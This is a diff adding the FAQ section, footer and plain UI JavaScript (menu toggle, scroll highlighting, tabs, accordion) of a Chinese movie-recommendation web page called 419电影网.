+      <div class="ac"><div class="acq">豆瓣评分 8.0 以上算什么水平？<span class="ar">＋</span></div><div class="acb"><div>在豆瓣体系中，8.0 以上通常意味着口碑良好、值得一看，进入 8.5 基本是年度佳作候选。419电影网的高分片单只收录 8.0 以上的影片，帮你节省选片时间。</div></div></div>
+      <div class="ac"><div class="acq">「高分」和「热门」有什么区别？<span class="ar">＋</span></div><div class="acb"><div>热门看的是当下讨论度与播放热度，可能话题高但评价两极；高分看的是长期沉淀下来的观众口碑。两者结合筛选，才能既看当下最火的，也不错过真正的经典。</div></div></div>
+      <div class="ac"><div class="acq">如何判断一部电影是否适合自己？<span class="ar">＋</span></div><div class="acb"><div>先看类型标签和简介，再看评分与评分人数（人数越多越可信），最后快速浏览一下短评，基本就能判断风格是否对味。本站每部影片都标注了类型、时长与评分，方便你快速决策。</div></div></div>
+      <div class="ac"><div class="acq">为什么有些好片一直没火？<span class="ar">＋</span></div><div class="acb"><div>宣发资源、上映档期、题材小众都会影响一部电影的知名度。很多冷门佳片评分很高却鲜有人知，这也是 419电影网坚持做「精选推荐」的原因——让好片被更多人看见。</div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div class="logo2"><a class="logo" href="index.html"><span class="mk">419</span><b>电影<i>网</i></b></a><p>419电影网(https://419dianyingwang-wap.github.io)精选高分电影与热门影视，让你少踩雷、多看好片。</p></div>
+      <div class="fcol"><h5>找电影</h5><a href="#hot">正在热播</a><a href="#top">高分片单</a><a href="#genre">类型分区</a><a href="#guess">猜你喜欢</a></div>
+      <div class="fcol"><h5>类型</h5><a href="#genre">动作科幻</a><a href="#genre">悬疑犯罪</a><a href="#genre">喜剧温情</a><a href="#genre">动画纪录</a></div>
+      <div class="fcol"><h5>关于本站</h5><a href="#update">更新时间</a><a href="#faq">电影冷知识</a><a href="#update">内容说明</a><a href="#faq">意见反馈</a></div>
+    </div>
+    <div class="fbot">
+      <div>© 2026 419电影网 419dianyingwang-wap 版权所有 · 网站网址：https://419dianyingwang-wap.github.io</div>
+      <div><a href="index.html">网站首页</a> · <a href="#faq">免责声明</a> · <a href="#faq">隐私政策</a></div>
+    </div>
+  </div>
+</footer>
+
+<div class="fix">
+  <button id="topBtn" aria-label="回到顶部">↑</button>
+</div>
+
+<script>
+// 移动菜单
+var nav=document.getElementById('nav'),mb=document.getElementById('mb'),ov=document.getElementById('ov');
+function closeM(){nav.classList.remove('open');ov.classList.remove('show')}
+mb.addEventListener('click',function(){nav.classList.toggle('open');ov.classList.toggle('show')});
+ov.addEventListener('click',closeM);
+nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',closeM)});
+
+// 导航高亮
+var links=nav.querySelectorAll('a'),secs=[];
+links.forEach(function(a){var s=document.querySelector(a.getAttribute('href'));if(s)secs.push(s)});
+window.addEventListener('scroll',function(){
+  var pos=window.scrollY+120,idx=0;
+  secs.forEach(function(s,i){if(s.offsetTop<=pos)idx=i});
+  links.forEach(function(a,i){a.classList.toggle('on',i===idx)});
+});
+
+// 回到顶部
+var topBtn=document.getElementById('topBtn');
+window.addEventListener('scroll',function(){topBtn.classList.toggle('show',window.scrollY>400)});
+topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+
+// 星期 tab 切换
+var wkds=document.querySelectorAll('.wkd'),wkpans=document.querySelectorAll('.wkpan');
+wkds.forEach(function(t){
+  t.addEventListener('click',function(){
+    var i=t.cellIndex!==undefined?0:0;
+    var els=Array.prototype.slice.call(document.querySelectorAll('.wkd'));
+    i=els.indexOf(t);
+    wkds.forEach(function(x){x.classList.remove('on')});
+    wkpans.forEach(function(p){p.classList.remove('on')});
+    t.classList.add('on');
+    if(wkpans[i])wkpans[i].classList.add('on');
+  });
+});
+
+// FAQ 手风琴
+document.querySelectorAll('.ac').forEach(function(a){
+  a.addEventListener('click',function(){
+    var open=a.classList.contains('open');
+    document.querySelectorAll('.ac').forEach(function(x){x.classList.remove('open');x.querySelector('.acb').style.maxHeight=null});
+    if(!open){a.classList.add('open');a.querySelector('.acb').style.maxHeight=a.querySelector('.acb').scrollHeight+40+'px'}
+  });
+});
+// 默认展开第一项
+(function(){var f=document.querySelector('.ac.open .acb');if(f)f.style.maxHeight=f.scrollHeight+40+'px'})();
+</script>
+</body>
+</html>
